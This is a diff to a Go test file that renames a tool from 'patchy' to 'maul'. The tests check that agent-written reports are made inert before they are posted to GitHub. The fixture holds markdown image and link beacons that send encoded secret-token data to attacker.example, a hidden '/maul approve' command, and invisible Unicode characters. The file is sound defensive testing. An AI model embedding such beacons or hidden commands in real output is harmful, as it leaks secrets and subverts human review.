@@ -13,7 +13,7 @@ import (
 	"github.com/yuin/goldmark/ast"
 	"github.com/yuin/goldmark/text"
 
-	v1alpha1 "github.com/bitwise-media-group/patchy/api/v1alpha1"
+	v1alpha1 "github.com/devthenet-labs/maul/api/v1alpha1"
 )
 
 // hostileReport is a remediation or investigation report written to act on
@@ -29,7 +29,7 @@ const hostileReport = "## Summary\n\n" +
 	"![build status](https://attacker.example/c?d=c2VjcmV0LXRva2Vu)\n" +
 	"[details](https://attacker.example/l?d=c2VjcmV0) <https://attacker.example/a?d=x>\n" +
 	"<img src=\"https://attacker.example/i?d=x\">\n" +
-	"<!-- /patchy approve -->\n<details><summary>more</summary>hidden</details>\n" +
+	"<!-- /maul approve -->\n<details><summary>more</summary>hidden</details>\n" +
 	"[//]: # (hidden instruction)\n\n" +
 	"| a | b |\n| --- | --- |\n| 1 | 2 | hidden cell |\n\n" +
 	"Invisible: zero\u200bwidth, bidi \u202eesrever\u202c, tag \U000E0041.\n"
@@ -39,7 +39,7 @@ const hostileReport = "## Summary\n\n" +
 // built to act on GitHub stays shown and inert. Read as markdown, nothing in
 // it is a link or an image, raw HTML, a live reference or a mention; read
 // as the plain text a squash commit copies onto the default branch, nothing
-// in the body but patchy's own first line references an issue or mentions
+// in the body but maul's own first line references an issue or mentions
 // anyone.
 func TestPRBodyReportIsInert(t *testing.T) {
 	body, err := PRBody(123, hostileReport, false, nil, "", NetworkRoutes{})
@@ -48,7 +48,7 @@ func TestPRBodyReportIsInert(t *testing.T) {
 	}
 	first, rest, _ := strings.Cut(body, "\n")
 	if first != "Fixes #123" {
-		t.Fatalf("first line = %q, want patchy's own reference", first)
+		t.Fatalf("first line = %q, want maul's own reference", first)
 	}
 	if msg := checkSanitized(rest); msg != "" {
 		t.Errorf("%s\n%s", msg, body)
@@ -69,11 +69,11 @@ func TestPRBodyReportIsInert(t *testing.T) {
 
 // TestStageReportCommentIsInert: a stage report projected onto the tracking
 // issue is agent text too; it may not link, show an image, ping anyone or
-// hide anything, and patchy's marker stays the comment's only HTML.
+// hide anything, and maul's marker stays the comment's only HTML.
 func TestStageReportCommentIsInert(t *testing.T) {
 	got := RenderStageReportComment("Remediation", 1, hostileReport)
 	marker, rest, _ := strings.Cut(got, "\n")
-	if marker != "<!-- patchy:report Remediation/1 -->" {
+	if marker != "<!-- maul:report Remediation/1 -->" {
 		t.Fatalf("first line = %q, want the dedup marker", marker)
 	}
 	if msg := checkSanitized(rest); msg != "" {
@@ -108,11 +108,11 @@ func TestRemediationCommitMessageIsInert(t *testing.T) {
 	golden(t, "remediation_commit_hostile.txt", msg)
 }
 
-// TestPRBodyFallbackIsPatchyOnly: when PRBody cannot render, the body patchy
+// TestPRBodyFallbackIsMaulOnly: when PRBody cannot render, the body maul
 // opens the pull request with is its own words: the finding's tracking issue
 // as its one reference, nothing else live, so a render failure can never be
 // a way to post the agent's report raw.
-func TestPRBodyFallbackIsPatchyOnly(t *testing.T) {
+func TestPRBodyFallbackIsMaulOnly(t *testing.T) {
 	for _, issue := range []int{1, 123, 99999} {
 		body := PRBodyFallback(issue)
 		first, rest, _ := strings.Cut(body, "\n")
@@ -206,7 +206,7 @@ func TestFindingReportFitsGitHub(t *testing.T) {
 
 // TestFindingTextProperties: whatever an agent writes in its report or its
 // commit message, seeded and dense in every markdown and GitHub trick the
-// sanitiser knows, the pull request body is inert markdown below patchy's
+// sanitiser knows, the pull request body is inert markdown below maul's
 // own first line and, read as plain text, references and mentions nothing
 // there; the stage comment is inert markdown below its marker; the commit
 // message references and mentions nothing; and each fits GitHub's limit.
